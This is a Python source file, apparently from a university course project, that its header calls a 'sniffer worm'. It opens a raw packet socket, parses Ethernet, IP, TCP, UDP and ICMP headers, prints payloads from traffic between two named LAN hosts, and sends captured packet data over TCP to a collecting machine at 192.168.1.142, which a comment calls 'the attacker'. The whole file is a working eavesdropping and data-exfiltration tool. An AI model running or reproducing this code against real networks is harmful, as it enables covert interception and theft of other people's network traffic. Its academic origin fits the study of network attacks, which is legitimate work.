#---------------------------------------------------------------------------------
#   Authors:        Niklas Philip Domingo
#                   Gillian Florin
#                   John Carlo Salinas
#   Course:         CPE 3252: Information Engineering
#   File Name:      sniffer.py
#   Description:    a program for the sniffer worm for the client.
#----------------------------------------------------------------------------------
import socket, sys
from struct import *
import fcntl, os
import time

def eth_addr(a):

	mac = ""
	for val in a:
		grp = "{:2x}".format(val)
		grp = grp.replace(' ', '')
		if len(grp) == 1:
			mac = "{}0{}:".format(mac,grp)
		else:
			mac = "{}{}:".format(mac,grp)
	
	# print("MAC ADDRESS: {}\n".format(mac[:len(mac)-1]))
	return mac[:len(mac)-1]

def open_socket():

	device_dict = {}
	data = []

	protocol_dict = {1: "ICMP", 6: "TCP", 17: "UDP", }
	# https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
	
	try:
		s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
		#fcntl.fcntl(s, fcntl.F_SETFL, os.O_NONBLOCK)
		print("Listening socket creation successful........\n")
	except socket.error as err:
		print("Socket could not be created. Error code : {}".format(err))
		sys.exit(1)
	
	# client socket
	sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sc.connect(('192.168.1.142', 4000))
	
	prevTime = time.time()
	
	while True:
		recv = False
		try:
			
			package, add = s.recvfrom(65536)
			# ================ Layer 2 Information - Data Link =======================
			
			# extract the first 14 bytes of the frame
			l2_header = package[:14]
			dest_mac, src_mac, proto = unpack('!6s 6s H', l2_header)
			dest_mac = eth_addr(dest_mac)
			src_mac = eth_addr(src_mac)
			eth_protocol = socket.htons(proto)
			l3_packet = package[14:]
			
			if (dest_mac == "ff:ff:ff:ff:ff:ff" or (src_mac == "0: 0: 0: 0: 0: 0")):
				continue
					
			#================= Layer 3 Information - Network ==========================
			
			# extract the first 20 bytes from eth_payload for the IP header
			ip_header = l3_packet[:20]
			
			# unpacket the ip_header
			# check https://docs.python.org/2/library/struct.html#format-characters
			ipheader_unpack = unpack('!BBHHHBBH4s4s', ip_header)
			
			version_ihl = ipheader_unpack[0]
			version = version_ihl >> 4
			ihl = version_ihl & 0x0F
			iph_length = ihl*4
			
			ttl = ipheader_unpack[5]
			protocol = ipheader_unpack[6]
			source_addr = socket.inet_ntoa(ipheader_unpack[8])
			destination_addr = socket.inet_ntoa(ipheader_unpack[9])
			l4_segment = l3_packet[iph_length:]
			
			if(version !=4):
				continue
			#print("Source Address: {}".format(source_addr))
			#======================= Layer 4 Information - Transport =================
			
			if(protocol_dict[protocol] == "ICMP"):
				
				icmp_header = l4_segment[:8]
				my_Data = l4_segment[8:]
				data_length = len(my_Data)
				recv = True
				
			elif(protocol_dict[protocol] == "TCP"):
				
				tcp_header = l4_segment[:20]
				tcph = unpack('!HHLLBBHHH', tcp_header)
				source_port = tcph[0]
				destin_port = tcph[1]
				seq_number = tcph[2]
				ack_number = tcph[3]
				reserve = tcph[4]
				tcph_len = reserve >> 4
				tcpData_start = tcph_len*4
				my_Data = l4_segment[tcpData_start:]
				data_length = len(my_Data)
				recv = True
				
			elif(protocol_dict[protocol] == "UDP"):
				
				udp_header = l4_segment[:8]
				udph = unpack('!HHHH', udp_header)
				sourec_port = udph[0]
				destin_port = udph[1]
				udph_length = udph[2]
				udpData_start = udph_length*4
				my_Data = l4_segment[udpData_start:]
				data_length = len(my_Data)
			else:
				continue
			
			if src_mac != '00:00:00:00:00:00':
				if src_mac in device_dict:
					data = device_dict[src_mac]
					data[0] += 1
					data[1] += data_length
				else:
					data = [1, data_length]
					device_dict[src_mac] = data
				
		except socket.error as e:
			pass
			
		# ==================== print out details =================================
		# ==================== Store in CSV file =================================
		
		# listens communication between 192.168.1.136 and 192.168.1.133
		if recv and (source_addr == '192.168.1.136' or source_addr == '192.168.1.133') and data_length>0:
			print("Source MAC Address     : {}".format(src_mac))
			print("Destination MAC Address: {}".format(dest_mac))
			print("IP Protocol	       : {}".format(protocol_dict[protocol]))
			print("Source IP Address      : {}".format(source_addr))
			print("Destination IP Address : {}".format(destination_addr))
			print("{} Data length        : {}".format(protocol_dict[protocol], data_length))
			print("Capture Data	       : {}".format(my_Data))
			print("\n")

		# sends data to the attacker
		if destination_addr != '192.168.1.142':	
			sc.send(my_Data)

open_socket()